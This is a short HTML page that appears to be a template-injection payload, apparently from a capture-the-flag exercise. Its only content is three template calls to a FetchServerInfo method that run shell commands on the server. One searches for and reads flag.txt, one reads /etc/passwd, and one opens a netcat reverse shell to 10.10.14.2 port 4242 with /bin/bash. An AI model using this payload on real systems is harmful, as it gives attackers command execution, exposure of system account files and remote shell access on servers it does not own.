<!doctype html>
<html>
  <head>
    <title>This is the title of the webpage!</title>
  </head>
  <body>
<p>{{.FetchServerInfo "find / -name flag.txt | cat"}}</p>
    <p>{{.FetchServerInfo "cat /etc/passwd"}}</p>
<p>{{.FetchServerInfo "nc 10.10.14.2 4242 -e /bin/bash"}}</p>

  </body>
</html>
